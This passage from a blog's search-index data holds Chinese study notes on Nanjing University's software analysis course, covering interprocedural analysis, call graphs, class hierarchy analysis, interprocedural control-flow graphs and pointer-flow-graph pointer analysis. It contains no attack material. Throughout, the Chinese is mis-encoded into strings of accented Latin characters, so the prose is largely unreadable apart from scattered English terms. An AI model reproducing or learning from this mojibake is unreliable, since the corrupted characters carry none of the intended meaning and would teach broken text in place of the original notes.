Analysisï¼‰ï¼Œè¿‡ç¨‹å†…åˆ†æèšç„¦äºå‡½æ•°å†…éƒ¨ï¼Œå¯¹äºå‡½æ•°é—´çš„è°ƒç”¨é‡‡å–çš„ç­–ç•¥æ˜¯æœ€ä¿å®ˆï¼ˆå®‰å…¨ï¼‰çš„å‡è®¾ï¼Œä½†æ˜¯å®‰å…¨æ€§é«˜ä¼´éšçš„å°±æ˜¯ç²¾ç¡®åº¦ä½ï¼Œå¦‚ä¸‹å›¾ï¼Œè¿‡ç¨‹å†…åˆ†æå°±ä¼šå°†å˜é‡ xï¼Œyï¼Œn è®¾ç½®ä¸º NAC ä½†æ˜¯è¿‡ç¨‹é—´åˆ†æå¢åŠ äº† call å’Œ return è¾¹ï¼Œè¿™æ ·å¯ä»¥å°†ä¸åŒå‡½æ•°çš„æ•°æ®æµä¿¡æ¯é€šè¿‡è¾¹æ¥ä¼ è¾“ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œxï¼Œyï¼Œn åˆ†åˆ«ä¸º 42ï¼Œ 43ï¼Œ 10 æƒ³è¦è¿›è¡Œè¿‡ç¨‹é—´åˆ†æï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦è°ƒç”¨å›¾ï¼ˆcall graphï¼‰\n1. 2è°ƒç”¨å›¾ è°ƒç”¨å›¾å°±æ˜¯ç¨‹åºä¸­è°ƒç”¨å…³ç³»çš„è¡¨ç¤ºï¼Œæœ¬è´¨æ˜¯è°ƒç”¨è¾¹çš„é›†åˆï¼Œä»è°ƒç”¨ç‚¹ï¼ˆcall-sitesï¼‰åˆ°ç›®æ ‡å‡½æ•°ï¼ˆtarget methods / calleesï¼‰çš„è¾¹ åº”ç”¨ï¼šæ˜¯æ‰€æœ‰è¿‡ç¨‹é—´åˆ†æï¼ˆè·¨å‡½æ•°åˆ†æï¼‰çš„åŸºç¡€ï¼Œå¯¹äºç¨‹åºä¼˜åŒ–ï¼Œç¨‹åºç†è§£ï¼Œç¨‹åºè°ƒè¯•ç­‰æœ‰å¾ˆé‡è¦çš„ä½œç”¨ã€‚\n1. 3é’ˆå¯¹é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡è¯­è¨€ (OOPLs) çš„è°ƒç”¨å›¾æ„é€  ä¸»è¦æœ‰å¦‚ä¸‹å‡ ç§æ„å»ºç®—æ³•ï¼Œä»ä¸Šå¾€ä¸‹ç²¾åº¦å˜é«˜ï¼Œé€Ÿåº¦å˜æ…¢ã€‚ä¸»è¦èšç„¦äºç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªç®—æ³• 1.4Java çš„è°ƒç”¨åˆ†ç±» OO è¯­è¨€çš„è°ƒç”¨å›¾æ„å»ºçš„å…³é”®ï¼ˆéš¾ç‚¹ï¼‰æ‰€åœ¨å°±æ˜¯è™šæ‹Ÿè°ƒç”¨ï¼Œå› ä¸ºå®ƒçš„ç›®æ ‡å‡½æ•°æœ‰å¤šä¸ªï¼Œå¹¶ä¸”éœ€è¦åœ¨è¿è¡Œæ—¶æ‰èƒ½ç¡®å®šã€‚ 1.5Method Dispatch of Virtual Calls å› ä¸ºåœ¨è¿è¡Œä¸­ï¼Œä¸€ä¸ªè™šæ‹Ÿå‡½æ•°çš„ resolvedï¼ˆæ„æ€å°±æ˜¯æŠŠè¿™ä¸ªè™šæ‹Ÿè°ƒç”¨â€œè§£â€ä¸ºç›®æ ‡å‡½æ•°ï¼‰åŸºäºä¸¤ç‚¹ï¼šreceiver objects çš„ç±»å‹å’Œè°ƒç”¨æ–¹æ³•çš„ç­¾åï¼ˆsignatureï¼‰ã€‚ O æ˜¯ receiverï¼Œfoo æ˜¯æ–¹æ³•ç­¾å Signature æ˜¯æ–¹æ³•çš„ä¸€ä¸ªæ ‡è¯†ï¼š\nSignature = class typeï¼ˆç±»ï¼‰ + method nameï¼ˆæ–¹æ³•åå­—ï¼‰ + descriptor Descriptor = return typeï¼ˆè¿”å›ç±»å‹ï¼‰ + parameter typesï¼ˆå‚æ•°ç±»å‹ï¼‰ å¦‚ä¸‹å›¾çš„ä¾‹å­ï¼Œè¡¨ç¤ºäº†ç±» C ä¸­çš„æ–¹æ³• foo çš„ signatureï¼ˆæ—è¾¹æ˜¯ç®€å†™æ–¹æ³•ï¼‰ æ¥ä¸‹æ¥ä»‹ç»æ±‚è§£ç›®æ ‡å‡½æ•°çš„æ–¹æ³• dispatch (c, m) ï¼Œc è¡¨ç¤º reciever objectï¼Œm è¡¨ç¤ºå‡½æ•°ç­¾å å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå½“ c å¯¹åº”çš„ç±»ä¸­çš„éæŠ½è±¡æ–¹æ³•ï¼ˆmâ€˜ï¼‰ï¼ˆéæŠ½è±¡æ–¹æ³•æ˜¯æŒ‡å®é™…å¯æ‰§è¡Œçš„å‡½æ•°ä¸»ä½“ï¼‰ä¸ m å…·æœ‰ç›¸åŒçš„åå­—å’Œ descriptorï¼Œè¿”å› mâ€˜ï¼Œå¦åˆ™é€’å½’æ‰§è¡Œ dispatchï¼ˆcâ€˜ï¼Œmï¼‰ï¼Œc\u0026rsquo;æ˜¯ c çš„çˆ¶ç±»ã€‚ å®ä¾‹ï¼š 2.Class Hierarchy Analysis (CHA) ç±»å±‚çº§åˆ†æ å‰æï¼šéœ€è¦æ•´ä¸ªç¨‹åºçš„ç±»å±‚æ¬¡ç»“æ„ä¿¡æ¯ (ç»§æ‰¿ç»“æ„) åŸç†ï¼šå‡è®¾æ¥æ”¶å˜é‡ a å¯ä»¥æŒ‡å‘ç±» a çš„å¯¹è±¡æˆ– a çš„æ‰€æœ‰å­ç±»ï¼Œé€šè¿‡æŸ¥æ‰¾ç±» A çš„ç±»å±‚æ¬¡ç»“æ„æ¥è§£æç›®æ ‡æ–¹æ³• ç®—æ³•ï¼š cs å°±æ˜¯ call site å¯¹äºé™æ€è°ƒç”¨ï¼Œç›´æ¥è¿”å›å‡½æ•°ç­¾å mï¼Œç›®æ ‡å‡½æ•°å°±æ˜¯è¯¥ç±»ä¸­çš„é™æ€å‡½æ•° (34æ¡æ¶ˆæ¯) javaæ€»ç»“ ç¬¬äº”ç«  é™æ€å˜é‡å’Œé™æ€å‡½æ•° è®¤è¯†å°è£…_mycamellliaçš„åšå®¢-CSDNåšå®¢_ä¸ºä»€ä¹ˆé™æ€å˜é‡å¯ä»¥é€šè¿‡ç±»è®¿é—®ä¹Ÿå¯ä»¥é€šè¿‡å¯¹è±¡è®¿é—® Javaä¸­ä½¿ç”¨é™æ€æ–¹æ³•çš„æƒ…å†µå’ŒåŸå› -CJavaPy å¯¹äºç‰¹æ®Šè°ƒç”¨ï¼Œå–å¾—å‡½æ•°ç­¾åçš„ç±»å‹ï¼Œé€’å½’è°ƒç”¨ dispatch æ–¹æ³• å¯¹äºç§æœ‰å‡½æ•°å’Œæ„é€ å‡½æ•°ï¼Œå®ƒä»¬å°±åœ¨å½“å‰ç±»ä¸­ï¼Œdispatch è¿”å›çš„å°±æ˜¯ m çˆ¶ç±»å‡½æ•°å°±éœ€è¦é€’å½’å»çˆ¶ç±»æ‰¾ç›®æ ‡å‡½æ•° å¯¹äºè™šæ‹Ÿè°ƒç”¨ï¼Œé¦–å…ˆå–å¾— cs çš„å˜é‡çš„å£°æ˜ç±»ï¼Œç„¶ååœ¨è¯¥ç±»æœ¬èº«å’Œè¯¥ç±»çš„å­ç±»ä¸­é€’å½’è§£æç›®æ ‡å‡½æ•° ç¤ºä¾‹ï¼š C çš„å£°æ˜ç±»å‹æ˜¯ Cï¼Œæ²¡æœ‰å­ç±»ï¼Œæ‰€ä»¥è§£æç›®æ ‡å‡½æ•°åªä¼šåœ¨ C ç±»ä¸­æ‰¾ åŒç†ï¼ŒA çš„å£°æ˜ç±»å‹æ˜¯ Aï¼Œæœ‰å­ç±» Bï¼ŒC ï¼ŒDï¼Œæ‰€ä»¥éƒ½è¦å»æ‰¾ B çš„å£°æ˜ç±»å‹æ˜¯ Bï¼Œé¦–å…ˆæ‰¾ B æœ¬èº«ï¼Œä½†æ˜¯ B æœ¬èº«æ²¡æœ‰å‡½æ•°ï¼Œæ ¹æ® dispatch æ–¹æ³•éœ€è¦å»å®ƒçš„çˆ¶ç±»å»æ‰¾ï¼Œç„¶åæ‰¾ B çš„å­ç±» é‚£ä¹ˆå¦‚æœ b ç¤ºä¾‹åŒ–äº†å‘¢ã€‚ CHA ç®—æ³•ä»ç„¶ä¼šæŠŠ C.foo å’Œ D.foo è§£æåˆ°ï¼Œä½†æ˜¯å®é™…ä¸Šå› ä¸º b å·²ç»å®ä¾‹åŒ–ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªå‡½æ•°æ ¹æœ¬ä¸ä¼šç”¨ï¼Œè¿™æ˜¯ CHA çš„å¼Šç«¯ã€‚\n2.1CHA çš„ç‰¹ç‚¹ CHA ä¼˜ç‚¹æ˜¯é€Ÿåº¦å¿«ï¼Œåªè€ƒè™‘å£°æ˜ç±»å‹ï¼Œå¿½ç•¥æ•°æ®æµå’Œæ§åˆ¶æµï¼›ç¼ºç‚¹æ˜¯å‡†ç¡®åº¦ä½ã€‚ æœ¬ç±»ä¸­æœ‰åŒåå‡½æ•°å°±åœ¨æœ¬ç±»å’Œå­ç±»æ‰¾ï¼Œæ²¡æœ‰å°±ä»çˆ¶ç±»æ‰¾ï¼Œæ¥ç€æ‰¾çˆ¶ç±»çš„å­ç±»ä¸­çš„åŒåå‡½æ•°ï¼ˆCHA åˆ†æï¼‰ã€‚ CHA åœ¨ IDE ä¸­ç”¨çš„æ¯”è¾ƒå¤š\n2.2åˆ©ç”¨ CHA æ„é€ è°ƒç”¨å›¾ åŸºæœ¬æ€æƒ³å°±æ˜¯éå†æ¯ä¸ªå‡½æ•°ä¸­çš„æ¯ä¸ªè°ƒç”¨æŒ‡ä»¤ï¼Œè°ƒç”¨CHAçš„Resolve()æ‰¾åˆ°å¯¹åº”çš„ç›®æ ‡å‡½æ•°å’Œè°ƒç”¨è¾¹ï¼Œå‡½æ•°+è°ƒç”¨è¾¹=è°ƒç”¨å›¾ã€‚ WL æ˜¯å¾…è§£æçš„æ–¹æ³• CG æ˜¯è°ƒç”¨å›¾ï¼Œè°ƒç”¨è¾¹çš„é›†åˆ RM å¯è¾¾æ–¹æ³•çš„é›†åˆï¼ˆå°±æ˜¯å·²ç»è§£æè¿‡çš„æ–¹æ³•ï¼Œé¿å…é‡å¤è§£æï¼‰ è€å¸ˆåœ¨è¿™é‡Œè®²äº†ä¸€ä¸ªå»ºå›¾çš„ä¾‹å­ï¼Œå»ºè®®çœ‹è§†é¢‘èµ°ä¸€é\n3. è¿‡ç¨‹é—´çš„æ§åˆ¶æµå›¾ Interprocedural Control-Flow Graph CFG è¡¨ç¤ºå•ä¸ªæ–¹æ³•çš„ç»“æ„ï¼ŒICFG è¡¨ç¤ºæ•´ä¸ªç¨‹åºçš„ç»“æ„ ç¨‹åºçš„ ICFG ç”±æ–¹æ³•çš„ CFG ç»„æˆï¼Œä¸åŒç¨‹åºçš„ CFG é€šè¿‡è°ƒç”¨è¾¹å’Œè¿”å›è¾¹äº’è”ï¼Œç»„æˆäº† ICFG è°ƒç”¨è¾¹ call edgesï¼šä»è°ƒç”¨ç‚¹åˆ°è¢«è°ƒç”¨è€…çš„å…¥å£èŠ‚ç‚¹ è¿”å›è¾¹ return edgesï¼šä»è°ƒç”¨çš„å‡ºå£èŠ‚ç‚¹åˆ°ä»è¢«è°ƒç”¨è€…çš„å‡ºå£èŠ‚ç‚¹åˆ°å…¶è°ƒç”¨ç‚¹ (å³è¿”å›ç‚¹) åé¢çš„è¯­å¥ã€‚ å®ä¾‹ï¼š 4. è¿‡ç¨‹é—´æ•°æ®æµåˆ†æ Interprocedural Data-Flow Analysis è¿‡ç¨‹é—´åˆ†æå’Œè¿‡ç¨‹å†…åˆ†æçš„åŒºåˆ« Call edge transferï¼šå°†æ•°æ®æµä»è°ƒç”¨ç«™ç‚¹ä¼ è¾“åˆ°è¢«è°ƒç”¨æ–¹çš„å…¥å£èŠ‚ç‚¹ (æ²¿è°ƒç”¨è¾¹)ï¼ˆä¼ è¾“å‚æ•°å€¼ï¼‰ Return edge transferï¼šå°†æ•°æ®æµä»è¢«è°ƒç”¨æ–¹çš„å‡ºå£èŠ‚ç‚¹ä¼ è¾“åˆ°è¿”å›ç«™ç‚¹ (æ²¿è¿”å›è¾¹)ï¼ˆä¼ è¾“è¿”å›å€¼ï¼‰ Node transferï¼šå’Œè¿‡ç¨‹å†…å¸¸é‡ä¼ æ’­æ˜¯ä¸€æ ·çš„ï¼Œå¯¹æ¯ä¸ªè°ƒç”¨ç‚¹ï¼Œå°†ç­‰å·å·¦è¾¹éƒ¨åˆ† kill æ‰ã€‚ï¼ˆæ„æ€å°±æ˜¯è¯¥ç»“ç‚¹çš„ out è¦æŠŠåœ¨ in ä¸­æŠŠç»“ç‚¹å†…çš„å·¦è¾¹å˜é‡å»æ‰ï¼Œä¸ºå•¥å‘¢ï¼Œå·¦è¾¹å˜é‡çš„å€¼äº¤ç»™è¿”å›è¾¹æ¥ç”Ÿæˆï¼‰ ç¤ºä¾‹ æ³¨æ„å›¾ä¸­æœ‰ä¸¤æ¡ call-to-return è¾¹ï¼Œè¿™ä¸ªè¾¹æ˜¯ä¸èƒ½çœå»çš„ï¼Œå› ä¸ºè¿™ç§ç±»å‹çš„è¾¹è´Ÿè´£äº†æœ¬åœ°æ•°æ®çš„æµåŠ¨ï¼Œæ¯”å¦‚è¯´é‚£ä¸ª a å’Œ c æ²¡æœ‰å‚ä¸å‡½æ•°çš„è°ƒç”¨ï¼Œé‚£ä¹ˆå®ƒä¿©å°±é¡ºç€è¿™ä¸ªè¾¹æµåˆ°äº†ä¸‹ä¸€ä¸ªç»“ç‚¹ï¼Œè€Œæ— éœ€ä¹Ÿå» ten æ–¹æ³•é‡Œé¢ç»•ä¸€åœˆï¼Œæé«˜åˆ†æçš„æ•ˆç‡ã€‚ æœ€åä¸¤ä¸ªç»“ç‚¹ä¹Ÿè§£é‡Šäº†ä¸ºå•¥è¦ kill æ‰ LHS (left hand side ç­‰å·å·¦è¾¹çš„å€¼)ï¼Œå¦‚æœä¸ kill æ‰ bï¼Œé‚£ä¹ˆæœ€åä¸€ä¸ªç»“ç‚¹çš„ b å°†ä¼šæœ‰ä¸¤ä¸ªè¾“å…¥ 7 å’Œ 10ï¼Œé‚£ä¹ˆåˆ†æç»“æœ b å°±æ˜¯ä¸€ä¸ªéå¸¸é‡ NAC äº†ã€‚ ","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%83%E8%8A%82%E7%AC%94%E8%AE%B0/","summary":"è§†é¢‘ï¼š å—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹07ï¼ˆInterprocedural Analysis è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼š(34æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§","title":"å—å¤§è½¯ä»¶åˆ†æç¬¬ä¸ƒèŠ‚ç¬”è®°"},{"content":"è§†é¢‘ï¼šå—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹09ï¼ˆPointer Analysis - Foundations Iï¼‰å“”å“©å“”å“©_bilibili è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼š(34æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹â€”16è¯¾æ—¶å®Œæ•´ç‰ˆ_bsauceçš„åšå®¢-CSDNåšå®¢_å—äº¬å¤§å­¦è½¯ä»¶åˆ†æ è½¯ä»¶åˆ†æ - çŸ¥ä¹ (zhihu.com) PPTï¼š Pointer Analysis: Foundations (nju.edu.cn)\n1æŒ‡é’ˆåˆ†æè§„åˆ™ é¦–å…ˆç¡®å®šåˆ†æåŸŸå’Œè®°å·çš„è¡¨ç¤º å˜é‡ã€å‡½æ•°ã€å¯¹è±¡ã€å®ä¾‹åŸŸã€æŒ‡é’ˆã€æŒ‡å‘å…³ç³» é’ˆå¯¹ä¸ŠèŠ‚è¯¾æœ«å°¾æåˆ°çš„å››ç§å¥å­è¿›è¡Œåˆ†æ æ¨ªçº¿ä¸Šçš„æ˜¯å‰ææ¡ä»¶ï¼Œæ¨ªçº¿ä¸‹çš„æ˜¯ç»“è®º\n2 å¦‚ä½•å®ç°æŒ‡é’ˆåˆ†æ æœ¬è´¨ä¸ŠæŒ‡é’ˆåˆ†æå°±æ˜¯è¦å°†æŒ‡é’ˆå…³ç³»é€šè¿‡æŒ‡é’ˆï¼ˆvariables\u0026amp;fieldsï¼‰è¿›è¡Œä¼ æ’­ å…³é”®åœ¨äºå½“ pt (x) å‘ç”Ÿæ”¹å˜ï¼Œå°†æ”¹å˜çš„éƒ¨åˆ†ä¼ æ’­åˆ° x ç›¸å…³çš„æŒ‡é’ˆã€‚ ç”¨å›¾æ¥è§£å†³å¦‚ä½•ä¼ æ’­çš„é—®é¢˜\nPFG Pointer Flow Graph æŒ‡é’ˆæµå›¾ ç¨‹åºçš„æŒ‡é’ˆæµå›¾æ˜¯ä¸€ä¸ªæœ‰å‘å›¾ï¼Œå®ƒè¡¨ç¤ºå¯¹è±¡å¦‚ä½•åœ¨ç¨‹åºä¸­çš„æŒ‡é’ˆä¹‹é—´æµåŠ¨ã€‚\nNodesï¼šæŒ‡é’ˆï¼ŒA node n represents a variable or a field of an abstract object Edgesï¼šAn edge ğ‘¥ â†’ ğ‘¦ means that the objects pointed by pointer ğ‘¥ may flow to (and also be pointed to by) pointer y åŸºäºç¨‹åºè¯­å¥å’Œç›¸åº”çš„è§„åˆ™å¾€ PFG ä¸­æ·»åŠ è¾¹ åŸºäº PFGï¼ŒæŒ‡é’ˆåˆ†æå¯ä»¥é€šè¿‡è®¡ç®— PFG çš„ä¼ é€’é—­åŒ…æ¥è§£å†³ï¼Œå¦‚ä¸‹å›¾ï¼šåŸºäº PFGï¼Œè¯­å¥ j å¯ä»¥ä»ç»“ç‚¹ b æ²¿ç€è·¯å¾„ bã€aã€oi. fã€e æ¥ä¼ æ’­ ç»¼ä¸Šï¼ŒæŒ‡é’ˆåˆ†è®¸åˆ†ä¸ºä¸¤æ­¥\næ„å»º PFG åŸºäº PFG ä¼ æ’­æŒ‡å‘å…³ç³»ä¿¡æ¯ è¿™ä¸¤æ­¥äº’ç›¸ä¾èµ–ï¼Œç›¸è¾…ç›¸æˆã€‚ä¼ æ’­æŒ‡å‘ä¿¡æ¯éœ€è¦åŸºäºæ„å»ºå¥½çš„ PFGï¼Œåœ¨ä¼ æ’­æŒ‡å‘ä¿¡æ¯çš„åŒæ—¶ PFG ä¹Ÿåœ¨åŠ¨æ€æ›´æ–°ã€‚\n3 æŒ‡é’ˆåˆ†æçš„ç®—æ³• WL åŒ…å«äº†ç­‰å¾…å¤„ç†çš„æŒ‡å‘å…³ç³»ï¼Œå…¶ä¸­çš„å…ƒç´ æ˜¯æŒ‡é’ˆ n å’ŒæŒ‡å‘å…³ç³»é›†åˆ ptsï¼Œ\u0026lt;n,pts\u0026gt;ï¼Œè¡¨ç¤º pts åº”è¯¥è¢«æ·»åŠ åˆ° pt (n) ä¸­ã€‚ AddEdge AddEdge (s, t) æ˜¯å°† s-\u0026gt;t è¿™æ¡è¾¹åŠ åˆ° PFG ä¸­ï¼š\nå½“ PFG ä¸­æ²¡æœ‰ s-\u0026gt;t æ—¶ï¼Œå°†è¿™æ¡è¾¹åŠ å…¥ PFG ä¸­ å¦‚æœ s çš„æŒ‡å‘å…³ç³»ï¼ˆpt (s)ï¼‰ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå°±éœ€è¦å°† s çš„æŒ‡å‘å…³ç³»ä¼ æ’­åˆ° tï¼Œæ‰€ä»¥åœ¨ WL ä¸­æ·»åŠ \u0026lt;t,pt(s)\u0026gt; Propagate Propagate (n, pts) æ˜¯å°† pts æ·»åŠ åˆ° n çš„æŒ‡å‘å…³ç³»ä¸­ï¼š\nå¦‚æœ pts ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå°±å°† pts å’Œ pt (n) åˆå¹¶ ç„¶åå°† pts ä¼ æ’­åˆ°ç»“ç‚¹ n å¯ä»¥æŒ‡å‘çš„æ‰€æœ‰ç»“ç‚¹ä¸­ Main Algorithms é¦–å…ˆåˆå§‹åŒ–ç®—æ³•ï¼ŒWL å’Œ PFG ä¸ºç©ºï¼Œå¹¶å¤„ç†æ‰€æœ‰çš„ new è¯­å¥ å¤„ç†æ‰€æœ‰çš„ assign è¯­å¥ å¤„ç† WL ä¸­çš„æ¡ç›® å–å‡º\u0026lt;n, pts\u0026gt;ï¼Œè¿›è¡Œå»é‡æ“ä½œï¼Œé¿å…å†—ä½™ï¼Œå°†å»é‡åçš„æŒ‡å‘å…³ç³»å‘ n ä¼ æ’­ å½“ n è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆå¯èƒ½éœ€è¦å»å¤„ç† store å’Œ load æŒ‡ä»¤ å¦‚æœå˜é‡ x æœ‰ store æŒ‡ä»¤ï¼Œåˆ™æ·»åŠ ä¸€æ¡è¾¹ y æŒ‡å‘å˜é‡ x æŒ‡å‘çš„ oi çš„ field æœ€å¼€å§‹æœ‰ç‚¹å¥‡æ€ªé‚£ä¸ªæŠŠ oi ä» $\\Delta$ å–å‡ºæ¥çš„æ“ä½œï¼Œæ˜¯å› ä¸ºå·²ç»æ‰§è¡Œè¿‡ propagate äº†ï¼Œæ­¤æ—¶å˜é‡ x æ–°æŒ‡å‘çš„å°±æ˜¯ $\\Delta$ï¼Œæ‰€ä»¥ $\\Delta$ å°±æ˜¯ xï¼Œx å°±æ˜¯ $\\Delta$ å¦‚æœå˜é‡ x æœ‰ load æŒ‡ä»¤ï¼Œåˆ™æ·»åŠ ä¸€æ¡è¾¹ oi çš„ field æŒ‡å‘ y è€å¸ˆç»™äº†ä¸ªä¾‹å­ï¼Œå»ºè®®çœ‹è§†é¢‘è¿‡ä¸€éä¾‹å­ã€‚ è¯¾é—´æåˆ°äº†å‡ ä¸ª Java çš„å¼€æºé™æ€åˆ†æé¡¹ç›®ï¼šSootã€WALAã€Chordã€‚\n","permalink":"https://juhuax.github.io/posts/study/4.%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B9%9D%E8%8A%82pointer-analysis-foundations-i/","summary":"è§†é¢‘ï¼šå—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹09ï¼ˆPointer Analysis - Foundations Iï¼‰å“”å“©å“”å“©_bilibili è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼š(34æ¡æ¶ˆæ¯","title":"å—å¤§è½¯ä»¶åˆ†æç¬¬ä¹èŠ‚â€”â€”Pointer Analysis - Foundations I"},{"content":"è§†é¢‘ï¼š å—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹ 08ï¼ˆPointer Analysis è¯¾ç¨‹ä¸»é¡µï¼šStatic Program Analysis | Tai-e (pascal-lab.net) ç¬”è®°å‚è€ƒï¼š(34æ¡æ¶ˆæ¯) ã€è¯¾ç¨‹ç¬”è®°ã€‘å—å¤§è½¯ä»¶åˆ†æè¯¾ç¨‹â€”16è¯¾æ—¶å®Œæ•´ç‰ˆ_bsauceçš„åšå®¢-CSDNåšå®¢_å—äº¬å¤§å­¦è½¯ä»¶åˆ†æ è½¯ä»¶åˆ†æ - çŸ¥ä¹ (zhihu.com) PPTï¼š Pointer Analysis (nju.edu.cn)\nMotivation CHA ç®—æ³•å­˜åœ¨ç¼ºé™·ï¼ˆä¸Šä¸€èŠ‚è¯¾æœ‰è¯´ï¼‰ ä¸Šä¸€èŠ‚æåˆ°è¿‡ CHA ç®—æ³•æ˜¯é’ˆå¯¹ call site çš„å£°æ˜ç±»å¯»æ‰¾ç›®æ ‡å‡½æ•°ï¼Œæ‰€ä»¥å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œn.get çš„å£°æ˜ç±»æ˜¯ Numberï¼ŒNumber æœ‰ä¸‰ä¸ªå­ç±»ï¼Œæ‰€ä»¥æ‰¾åˆ°çš„ç›®æ ‡å‡½æ•°å°±æ˜¯ä¸‰ä¸ªç»“æœï¼Œä½†æ˜¯è¿™ä¸ªç»“æœæ˜¯ä¸å‡†ç¡®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨åˆ°æŒ‡é’ˆåˆ†æï¼Œå»å¯»æ‰¾ call site çœŸæ­£æŒ‡å‘çš„é‚£ä¸ªå‡½æ•°ã€‚\nIntroduction to Pointer Analysis æŒ‡é’ˆåˆ†æ æŒ‡é’ˆåˆ†ææ˜¯åŸºæœ¬çš„é™æ€åˆ†æï¼Œç”¨äºè®¡ç®—ä¸€ä¸ªæŒ‡é’ˆå¯ä»¥æŒ‡å‘çš„å†…å­˜ä½ç½®ï¼Œå¯¹äºé¢å‘å¯¹è±¡ç¨‹åºæ¥è¯´æ˜¯è®¡ç®—ä¸€ä¸ªæŒ‡é’ˆï¼ˆå˜é‡æˆ–å­—æ®µï¼‰å¯ä»¥æŒ‡å‘å“ªäº›å¯¹è±¡ æŒ‡é’ˆåˆ†ææ˜¯ä¸€ç§ may åˆ†æï¼Œå®ƒçš„åˆ†æç»“æœæ˜¯å¯ä»¥æŒ‡å‘çš„å¯¹è±¡çš„é›†åˆ å¦‚ä¸Šå›¾çš„ä¾‹å­ï¼ŒæŒ‡é’ˆåˆ†æå¾—åˆ°çš„æ˜¯æŒ‡å‘å…³ç³»ï¼ˆpoint-to relationsï¼‰ æŒ‡é’ˆåˆ†æå’Œåˆ«ååˆ†æçš„åŒºåˆ« ä¸¤ä¸ªå¯†åˆ‡ç›¸å…³ä½†ä¸åŒçš„æ¦‚å¿µ æŒ‡é’ˆåˆ†æ: æŒ‡é’ˆå¯ä»¥æŒ‡å‘å“ªäº›å¯¹è±¡? åˆ«ååˆ†æ: ä¸¤ä¸ªæŒ‡é’ˆå¯ä»¥æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡å—? åˆ«åä¿¡æ¯å¯ä»¥ä»æŒ‡å‘å…³ç³»ä¸­è·å¾—\næŒ‡é’ˆåˆ†æçš„åº”ç”¨ åŸºæœ¬ä¿¡æ¯ï¼ˆåˆ«ååˆ†æ/è°ƒç”¨å›¾ï¼‰ ç¼–è¯‘ä¼˜åŒ–ï¼ˆåµŒå…¥è™šæ‹Ÿè°ƒç”¨ï¼‰ æ¼æ´ï¼ˆç©ºæŒ‡é’ˆï¼‰ å®‰å…¨åˆ†æï¼ˆä¿¡æ¯æµï¼‰ Key Factors of Pointer Analysis æŒ‡é’ˆåˆ†ææ˜¯ä¸€ä¸ªå¤æ‚çš„ç³»ç»Ÿï¼Œè®¸å¤šå› ç´ éƒ½ä¼šå½±å“æŒ‡é’ˆåˆ†æçš„ç²¾åº¦å’Œæ•ˆç‡ å †æŠ½è±¡ ç¨‹åºåŠ¨æ€æ‰§è¡Œæ—¶ï¼Œå †å¯¹è±¡ä¸ªæ•°ç†è®ºä¸Šæ˜¯æ— ç©·æ— å°½çš„ï¼Œä½†é™æ€åˆ†ææ— æ³•å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚æ‰€ä»¥ä¸ºä¿è¯æŒ‡é’ˆåˆ†æå¯ä»¥ç»ˆæ­¢ï¼Œæˆ‘ä»¬é‡‡ç”¨å †æŠ½è±¡æŠ€æœ¯ï¼Œå°†æ— ç©·çš„å…·ä½“å¯¹è±¡æŠ½è±¡æˆæœ‰é™çš„æŠ½è±¡å¯¹è±¡ã€‚ä¹Ÿå³ï¼Œå°†æœ‰å…±æ€§çš„å¯¹è±¡æŠ½è±¡æˆ 1 ä¸ªé™æ€å¯¹è±¡ï¼Œä»è€Œé™åˆ¶é™æ€åˆ†æå¯¹è±¡çš„ä¸ªæ•°ã€‚ æœ¬èŠ‚ä»‹ç»çš„å †æŠ½è±¡æŠ€æœ¯æ˜¯ç›®å‰æœ€å¸¸ç”¨çš„å †æŠ½è±¡æŠ€æœ¯â€”â€”allocation-site æŠ€æœ¯\nåŸç†ï¼šå°†åŠ¨æ€å¯¹è±¡æŠ½è±¡æˆå®ƒä»¬çš„åˆ›å»ºç‚¹ï¼ˆAllocation-Siteï¼‰ï¼Œæ¥è¡¨ç¤ºåœ¨è¯¥ç‚¹åˆ›å»ºçš„æ‰€æœ‰åŠ¨æ€å¯¹è±¡ã€‚Allocation-Site ä¸ªæ•°æ˜¯æœ‰é™çš„ã€‚ ä¸Šä¸‹æ–‡æ•æ„Ÿ Context-sensitiveï¼šæ ¹æ®æŸå‡½æ•°è°ƒç”¨ä¸Šä¸‹æ–‡çš„ä¸åŒï¼Œå¤šæ¬¡åˆ†æåŒä¸€å‡½æ•°ã€‚ Context-insensitiveï¼šæ¯ä¸ªå‡½æ•°åªåˆ†æä¸€æ¬¡ã€‚ æµæ•æ„Ÿ æµæ•æ„Ÿ 